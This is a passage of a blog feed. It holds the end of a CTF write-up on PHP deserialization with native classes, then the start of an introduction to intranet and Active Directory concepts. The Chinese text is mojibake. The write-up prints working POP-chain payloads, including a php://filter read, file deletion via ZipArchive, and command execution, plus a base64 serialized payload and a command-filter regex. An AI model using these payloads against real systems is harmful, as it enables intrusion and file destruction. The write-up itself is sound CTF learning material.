href="https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip">https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip</a></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#39;shell.php&#39;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;        public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;class login&#123;    public $file;    public $filename;    public $content;    public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#39;login success you can to open shell file!&#39;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            die(&#39;success register admin&#39;);        &#125;else&#123;            die(&#39;please register admin &#39;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#39;waf.txt&#39;))&#123;            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);        &#125;    &#125;&#125;if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;])))&#123;    @unserialize(base64_decode($_POST[&#39;unser&#39;]));&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="img"><br>è¿™é‡Œååºåˆ—åŒ–å‰æœ‰ä¸ªæ ¡éªŒï¼Œç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡</p><pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2</code></pre><p>è¯»å–ä¸‹shell.phpçš„å†…å®¹<br>æ„é€ payload:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;whoami&#39;;$a-&gt;filename = &#39;php://filter/read=convert.base64-encode/resource=shell&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>è§£ç å¾—åˆ°shell.phpçš„æºç :</p><pre><code class="php">&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#39;so long!&#39;);     &#125;&#125;</code></pre><p>shell.phpå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>ä½†æ˜¯å¦‚æœè¦æ‰§è¡Œshell.php<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="img"><br>å¿…é¡»ä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦æƒ³åŠæ³•æŠŠå®ƒåˆ é™¤<br>æˆ‘ä»¬å¿…é¡»è¦ä½¿ç”¨åŸç”Ÿç±»ï¼Œè¿™ä¸ªåŸç”Ÿç±»è¿˜å¿…é¡»æ˜¯openæ–¹æ³•å¯ä»¥åˆ é™¤æ–‡ä»¶<br>éå†ä¸€ä¸‹:</p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;open&#39;        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="img"><br>ZipArchiveåˆšå¥½æœ‰ä¸ªopenæ–¹æ³•å¯ä»¥æ»¡è¶³,ä¸Šæ–‡å·²ç»ä»‹ç»è¿‡äº†<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="img"><br>ä¼ å…¥8ç›¸å½“äºé‡å†™æ–‡ä»¶<br>æœ€ç»ˆæ„é€ poc:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = 8;$a-&gt;filename = &#39;waf.txt&#39;;$a-&gt;file = new ZipArchive();echo base64_encode(serialize($a));</code></pre><pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre><p>ä¼ å…¥åwaf.txtå°±è¢«åˆ é™¤ï¼Œæˆ‘è¿™é‡Œæ˜¯æœ¬åœ°æ­å»ºçš„ç¯å¢ƒæ‰€ä»¥ç›´æ¥å¯ä»¥çœ‹åˆ°<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="img"><br>æ¥ä¸‹æ¥æ„é€ pocæ‰§è¡Œå‘½ä»¤å³å¯:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;type flag&#39;;$a-&gt;filename = &#39;111&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>æˆ‘è¿™é‡Œæ˜¯ç”¨windowsç³»ç»Ÿå¤ç°çš„ï¼Œæ‰€ä»¥ä½¿ç”¨å‘½ä»¤ä¸åŒï¼Œæ€è·¯éƒ½ä¸€æ ·<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="img"></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»&quot;&gt;&lt;a href=&quot;#æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»&quot; class=&quot;headerlink&quot; title=&quot;æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»&quot;&gt;&lt;/a&gt;æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»&lt;/h1&gt;&lt;p&gt; é€šè¿‡è¿™æ®µä»£ç æŸ¥çœ‹æ–¹æ³•çš„ç±»ï¼Œè¿™é‡Œçœ‹åˆ°__toStringæ–¹æ³•å¯¹åº”çš„Errorç±»  &lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="å¸¸è§æ¼æ´å’Œæ‰‹æ³•" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="php" scheme="https://sakurahack-y.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘å­¦ä¹ ç¯‡</title>
    <link href="https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/</id>
    <published>2022-07-13T06:56:01.000Z</published>
    <updated>2022-07-14T00:55:13.117Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« "><a href="#å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« " class="headerlink" title="å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« "></a>å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« </h1><h2 id="å†…ç½‘åŸºç¡€çŸ¥è¯†"><a href="#å†…ç½‘åŸºç¡€çŸ¥è¯†" class="headerlink" title="å†…ç½‘åŸºç¡€çŸ¥è¯†"></a>å†…ç½‘åŸºç¡€çŸ¥è¯†</h2><p><strong>å·¥ä½œç»„</strong>:å·¥ä½œç»„ï¼ˆ Work Group)ï¼Œåœ¨ä¸€ä¸ªå¤§çš„å•ä½å†…ï¼Œå¯èƒ½æœ‰æˆç™¾ä¸Šåƒå°ç”µè„‘äº’ç›¸è¿æ¥ç»„æˆå±€åŸŸç½‘ï¼Œå®ƒä»¬éƒ½ä¼šåˆ—åœ¨â€œç½‘ç»œï¼ˆç½‘ä¸Šé‚»å±…)â€å†…ï¼Œå¦‚æœè¿™äº›ç”µè„‘ä¸åˆ†ç»„ï¼Œå¯æƒ³è€ŒçŸ¥æœ‰å¤šä¹ˆæ··ä¹±ï¼Œè¦æ‰¾ä¸€å°ç”µè„‘å¾ˆå›°éš¾ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œå°±æœ‰äº†â€œå·¥ä½œç»„â€è¿™ä¸ªæ¦‚å¿µï¼Œå°†ä¸åŒçš„ç”µè„‘ä¸€èˆ¬æŒ‰åŠŸèƒ½(æˆ–éƒ¨é—¨ï¼‰åˆ†åˆ«åˆ—å…¥ä¸åŒçš„å·¥ä½œç»„ä¸­ï¼Œå¦‚æŠ€æœ¯éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œæŠ€æœ¯éƒ¨â€å·¥ä½œç»„ä¸­ï¼Œè¡Œæ”¿éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œè¡Œæ”¿éƒ¨â€å·¥ä½œç»„ä¸­ã€‚ä½ è¦è®¿é—®æŸä¸ªéƒ¨é—¨çš„èµ„æºï¼Œå°±åœ¨â€œç½‘ç»œâ€é‡Œæ‰¾åˆ°é‚£ä¸ªéƒ¨é—¨çš„å·¥ä½œç»„åï¼ŒåŒå‡»å°±å¯ä»¥çœ‹åˆ°é‚£ä¸ªéƒ¨é—¨çš„æ‰€æœ‰ç”µè„‘äº†ã€‚ç›¸æ¯”ä¸åˆ†ç»„çš„æƒ…å†µå°±æœ‰åºçš„å¤šäº†ï¼Œå°¤å…¶æ˜¯å¯¹äºå¤§å‹å±€åŸŸç½‘ç»œæ¥è¯´ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628095849118.png" alt="image-20220628095849118"></p><p><strong>åŸŸ</strong>(Domain)æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼ˆå®‰å…¨è¾¹ç•Œæ„æ€æ˜¯åœ¨ä¸¤ä¸ªåŸŸä¸­ï¼Œä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºï¼‰ï¼Œå¯ä»¥ç®€å•çš„æŠŠåŸŸç†è§£æˆå‡çº§ç‰ˆçš„â€œå·¥ä½œç»„â€ï¼Œç›¸æ¯”å·¥ä½œç»„è€Œè¨€,å®ƒæœ‰ä¸€ä¸ªæ›´åŠ ä¸¥æ ¼çš„å®‰å…¨ç®¡ç†æ§åˆ¶æœºåˆ¶,å¦‚æœä½ æƒ³è®¿é—®åŸŸå†…çš„èµ„æº,å¿…é¡»æ‹¥æœ‰ä¸€ä¸ªåˆæ³•çš„èº«ä»½ç™»é™†åˆ°è¯¥åŸŸä¸­,è€Œä½ å¯¹è¯¥åŸŸå†…çš„èµ„æºæ‹¥æœ‰ä»€ä¹ˆæ ·çš„æƒé™,è¿˜éœ€è¦å–å†³äºä½ åœ¨è¯¥åŸŸä¸­çš„ç”¨æˆ·èº«ä»½ã€‚<br><strong>åŸŸæ§åˆ¶å™¨</strong>ï¼ˆDomain Controllerï¼Œç®€å†™ä¸ºDcï¼‰æ˜¯ä¸€ä¸ªåŸŸä¸­çš„ä¸€å°ç±»ä¼¼ç®¡ç†æœåŠ¡å™¨çš„è®¡ç®—æœºï¼Œç›¸å½“äºä¸€ä¸ªå•ä½çš„é—¨å«ä¸€æ ·ï¼Œå®ƒè´Ÿè´£æ¯ä¸€å°è”å…¥çš„ç”µè„‘å’Œç”¨æˆ·çš„éªŒè¯å·¥ä½œï¼ŒåŸŸå†…ç”µè„‘å¦‚æœæƒ³äº’ç›¸è®¿é—®é¦–å…ˆéƒ½æ˜¯ç»è¿‡å®ƒçš„å®¡æ ¸ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100052625.png" alt="image-20220628100052625"></p><p><strong>åŸŸçš„åˆ†ç±»:</strong></p><p><strong>å•åŸŸ</strong><br>åœ¨ä¸€èˆ¬çš„å…·æœ‰å›ºå®šåœ°ç†ä½ç½®çš„å°å…¬å¸é‡Œï¼Œå»ºç«‹ä¸€ä¸ªåŸŸå°±å¯ä»¥æ»¡è¶³æ‰€éœ€ã€‚Â·ä¸€èˆ¬åœ¨ä¸€ä¸ªåŸŸå†…è¦å»ºç«‹è‡³å°‘ä¸¤ä¸ªåŸŸæœåŠ¡å™¨ï¼Œä¸€ä¸ªä½œä¸ºDcï¼Œä¸€ä¸ªæ˜¯å¤‡ä»½DCã€‚å¦‚æœæ²¡æœ‰ç¬¬äºŒä¸ªå¤‡ä»½Dcï¼Œé‚£ä¹ˆä¸€æ—¦DCç˜«ç—ªäº†ï¼Œåˆ™åŸŸå†…çš„å…¶ä»–ç”¨æˆ·å°±ä¸èƒ½ç™»é™†è¯¥åŸŸäº†ï¼Œå› ä¸ºæ´»åŠ¨ç›®å½•çš„æ•°æ®åº“ï¼ˆåŒ…æ‹¬ç”¨æˆ·çš„å¸å·ä¿¡æ¯)æ˜¯å­˜å‚¨åœ¨DCä¸­çš„ã€‚è€Œæœ‰ä¸€å°å¤‡ä»½åŸŸæ§åˆ¶å™¨ï¼ˆBDCï¼‰ï¼Œåˆ™è‡³å°‘è¯¥åŸŸè¿˜èƒ½æ­£å¸¸ä½¿ç”¨ï¼ŒæœŸé—´æŠŠç˜«ç—ªçš„Dcæ¢å¤äº†å°±è¡Œäº†ã€‚</p><p><strong>çˆ¶åŸŸ</strong></p><p>å‡ºäºç®¡ç†åŠå…¶ä»–ä¸€äº›éœ€æ±‚ï¼Œéœ€è¦åœ¨ç½‘ç»œä¸­åˆ’åˆ†å¤šä¸ªåŸŸï¼Œç¬¬ä¸€ä¸ªåŸŸç§°ä¸ºçˆ¶åŸŸï¼Œå„åˆ†éƒ¨çš„åŸŸç§°ä¸ºè¯¥åŸŸçš„å­åŸŸã€‚<br>æ¯”å¦‚ä¸€ä¸ªå¤§å…¬å¸ï¼Œå®ƒçš„ä¸åŒåˆ†å…¬å¸åœ¨ä¸åŒçš„åœ°ç†ä½ç½®ï¼Œåˆ™éœ€çˆ¶åŸŸåŠå­åŸŸè¿™æ ·çš„ç»“æ„ã€‚<br>å¦‚æœæŠŠä¸åŒåœ°ç†ä½ç½®çš„åˆ†å…¬å¸æ”¾åœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œé‚£ä¹ˆä»–ä»¬ä¹‹é—´ä¿¡æ¯äº¤äº’ï¼ˆåŒ…æ‹¬åŒæ­¥ï¼Œå¤åˆ¶ç­‰ï¼‰æ‰€èŠ±è´¹çš„æ—¶é—´ä¼šæ¯”è¾ƒé•¿ï¼Œè€Œä¸”å ç”¨çš„å¸¦å®½ä¹Ÿæ¯”è¾ƒå¤§ã€‚(å› ä¸ºåœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®æ˜¯å¾ˆå¤šçš„ï¼Œè€Œä¸”ä¸å‹ç¼©;è€Œåœ¨åŸŸå’ŒåŸŸä¹‹é—´ï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®ç›¸å¯¹è¾ƒå°‘ï¼Œè€Œä¸”å‹ç¼©ã€‚ï¼‰<br>è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå°±æ˜¯å­å…¬å¸å¯ä»¥é€šè¿‡è‡ªå·±çš„åŸŸæ¥ç®¡ç†è‡ªå·±çš„èµ„æºã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯å‡ºäºå®‰å…¨ç­–ç•¥çš„è€ƒè™‘ï¼Œå› ä¸ºæ¯ä¸ªåŸŸéƒ½æœ‰è‡ªå·±ç‹¬æœ‰çš„å®‰å…¨ç­–ç•¥ã€‚æ¯”å¦‚ä¸€ä¸ªå…¬å¸çš„è´¢åŠ¡éƒ¨é—¨å¸Œæœ›èƒ½ä½¿ç”¨ç‰¹å®šçš„å®‰å…¨ç­–ç•¥(åŒ…æ‹¬å¸å·å¯†ç ç­–ç•¥ç­‰ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥å°†è´¢åŠ¡éƒ¨é—¨åšæˆä¸€ä¸ªå­åŸŸæ¥å•ç‹¬ç®¡ç†ã€‚</p><p><strong>åŸŸæ ‘</strong></p><p>åŸŸæ ‘æŒ‡è‹¥å¹²ä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚ä¸€ä¸ªåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸçš„å†…éƒ¨ï¼Œä¸èƒ½è®¿é—®æˆ–è€…ç®¡ç†å…¶ä»–çš„åŸŸï¼ŒäºŒä¸ªåŸŸä¹‹é—´ç›¸äº’è®¿é—®åˆ™éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»(Trust Relation)ã€‚<br>ä¿¡ä»»å…³ç³»æ˜¯è¿æ¥åœ¨åŸŸä¸åŸŸä¹‹é—´çš„æ¡¥æ¢ã€‚åŸŸæ ‘å†…çš„çˆ¶åŸŸä¸å­åŸŸä¹‹é—´ä¸ä½†å¯ä»¥æŒ‰éœ€è¦ç›¸äº’è¿›è¡Œç®¡ç†ï¼Œè¿˜å¯ä»¥è·¨ç½‘åˆ†é…æ–‡ä»¶å’Œæ‰“å°æœºç­‰è®¾å¤‡èµ„æºï¼Œä½¿ä¸åŒçš„åŸŸä¹‹é—´å®ç°ç½‘ç»œèµ„æºçš„å…±äº«ä¸ç®¡ç†ï¼Œä»¥åŠç›¸äº’é€šä¿¡å’Œæ•°æ®ä¼ è¾“ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100413944.png" alt="image-20220628100413944"></p><p><strong>åŸŸæ£®æ—</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100503104.png" alt="image-20220628100503104"></p><p><strong>DNSåŸŸåæœåŠ¡å™¨</strong>æ˜¯è¿›è¡ŒåŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€(IPaddress)è½¬æ¢çš„æœåŠ¡å™¨ã€‚<br>åœ¨åŸŸæ ‘çš„ä»‹ç»ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åŸŸæ ‘ä¸­çš„åŸŸçš„åå­—å’ŒDNSåŸŸçš„åå­—éå¸¸ç›¸ä¼¼ï¼Œå®é™…ä¸ŠåŸŸçš„åå­—å°±æ˜¯DNSåŸŸçš„åå­—ï¼Œå› ä¸ºåŸŸä¸­çš„è®¡ç®—æœºä½¿ç”¨DNSæ¥å®šä½åŸŸæ§åˆ¶å™¨å’ŒæœåŠ¡å™¨ä»¥åŠå…¶ä»–è®¡ç®—æœºã€ç½‘ç»œæœåŠ¡ç­‰ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹,æˆ‘ä»¬åœ¨å†…ç½‘æ¸—é€æ—¶å°±é€šè¿‡å¯»æ‰¾DNSæœåŠ¡å™¨æ¥å®šä½åŸŸæ§åˆ¶å™¨ï¼Œå› ä¸ºé€šå¸¸DNSæœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨ä¼šå¤„åœ¨åŒä¸€å°æœºå™¨ä¸Šã€‚</p><p><strong>æ´»åŠ¨ç›®å½•</strong>ï¼ˆActive Directoryï¼‰æ˜¯åŸŸç¯å¢ƒä¸­æä¾›ç›®å½•æœåŠ¡çš„ç»„ä»¶ã€‚ç›®å½•æ˜¯ä»€ä¹ˆ?ç›®å½•å°±æ˜¯å­˜å‚¨æœ‰å…³ç½‘ç»œå¯¹è±¡ï¼ˆå¦‚ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€å…±äº«èµ„æºã€æ‰“å°æœºå’Œè”ç³»äººç­‰ï¼‰çš„ä¿¡æ¯ã€‚ç›®å½•æœåŠ¡æ˜¯å¸®åŠ©ç”¨æˆ·å¿«é€Ÿå‡†ç¡®çš„ä»ç›®å½•ä¸­æŸ¥æ‰¾åˆ°ä»–æ‰€éœ€è¦çš„ä¿¡æ¯çš„æœåŠ¡ã€‚<br>å¦‚æœå°†ä¼ä¸šçš„å†…ç½‘çœ‹æˆæ˜¯ä¸€æœ¬å­—å…¸ï¼Œé‚£ä¹ˆå†…ç½‘é‡Œçš„èµ„æºå°±æ˜¯å­—å…¸çš„å†…å®¹ï¼Œæ´»åŠ¨ç›®å½•å°±ç›¸å½“äºå­—å…¸çš„ç´¢å¼•ã€‚å³æ´»åŠ¨ç›®å½•å­˜å‚¨çš„æ˜¯ç½‘ç»œä¸­æ‰€æœ‰èµ„æºçš„å¿«æ·æ–¹å¼ï¼Œç”¨æˆ·é€šè¿‡å¯»æ‰¾å¿«æ·æ–¹å¼è€Œå®šä½èµ„æºã€‚</p><p><strong>é€»è¾‘ç»“æ„</strong></p><p>åœ¨æ´»åŠ¨ç›®å½•ä¸­ï¼Œç®¡ç†å‘˜å¯ä»¥å®Œå…¨å¿½ç•¥è¢«ç®¡ç†å¯¹è±¡çš„å…·ä½“åœ°ç†ä½ç½®ï¼Œè€Œå°†è¿™äº›å¯¹è±¡æŒ‰ç…§ä¸€å®šçš„æ–¹å¼æ”¾ç½®åœ¨ä¸åŒçš„å®¹å™¨ä¸­ã€‚ç”±äºè¿™ç§ç»„ç»‡å¯¹è±¡çš„åšæ³•ä¸è€ƒè™‘è¢«ç®¡ç†å¯¹è±¡çš„å…·ä½“åœ°ç†ä½ç½®ï¼Œè¿™ç§ç»„ç»‡æ¡†æ¶ç§°ä¸ºâ€œé€»è¾‘ç»“æ„â€ã€‚<br>æ´»åŠ¨ç›®å½•çš„é€»è¾‘ç»“æ„å°±åŒ…æ‹¬ä¸Šé¢è®²åˆ°çš„ç»„ç»‡å•å…ƒï¼ˆou)ã€åŸŸ(domain)ã€åŸŸæ ‘( tree)ã€åŸŸæ£®æ—ï¼ˆforestï¼‰ã€‚åœ¨åŸŸæ ‘å†…çš„æ‰€æœ‰åŸŸå…±äº«ä¸€ä¸ªæ´»åŠ¨ç›®å½•ï¼Œè¿™ä¸ªæ´»åŠ¨ç›®å½•å†…çš„æ•°æ®åˆ†æ•£åœ°å­˜å‚¨åœ¨å„ä¸ªåŸŸå†…ï¼Œä¸”æ¯ä¸€ä¸ªåŸŸåªå­˜å‚¨è¯¥åŸŸå†…çš„æ•°æ®ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628102316204.png" alt="image-20220628102316204"></p><p><strong>æ´»åŠ¨ç›®å½•ä¸»è¦åŠŸèƒ½</strong></p><p>å¸å·é›†ä¸­ç®¡ç†ï¼Œæ‰€æœ‰å¸å·å‡å­˜åœ¨æœåŠ¡å™¨ä¸Š,æ–¹ä¾¿å¯¹å¸å·çš„é‡å‘½ä»¤/é‡ç½®å¯†ç ã€‚<br>è½¯ä»¶é›†ä¸­ç®¡ç†ï¼Œç»Ÿä¸€æ¨é€è½¯ä»¶ï¼Œç»Ÿä¸€å®‰è£…ç½‘ç»œæ‰“å°æœºç­‰ã€‚åˆ©ç”¨è½¯ä»¶å‘å¸ƒç­–ç•¥åˆ†å‘è½¯ä»¶,å¯ä»¥è®©ç”¨æˆ·è‡ªç”±é€‰æ‹©å®‰è£…è½¯ä»¶ã€‚<br>ç¯å¢ƒé›†ä¸­ç®¡ç†ï¼Œåˆ©ç”¨ADå¯ä»¥ç»Ÿä¸€å®¢æˆ·ç«¯æ¡Œé¢,IE,TCP/IPç­‰è®¾ç½®ã€‚<br>å¢å¼ºå®‰å…¨æ€§ï¼Œç»Ÿä¸€éƒ¨ç½²æ€æ¯’è½¯ä»¶å’Œæ‰«æ¯’ä»»åŠ¡ï¼Œé›†ä¸­åŒ–ç®¡ç†ç”¨æˆ·çš„è®¡ç®—æœºæƒé™ã€ç»Ÿä¸€åˆ¶è®¢ç”¨æˆ·å¯†ç ç­–ç•¥ç­‰ï¼Œå¯ç›‘æ§ç½‘ç»œï¼Œèµ„æ–™ç»Ÿä¸€ç®¡ç†ã€‚æ›´å¯é 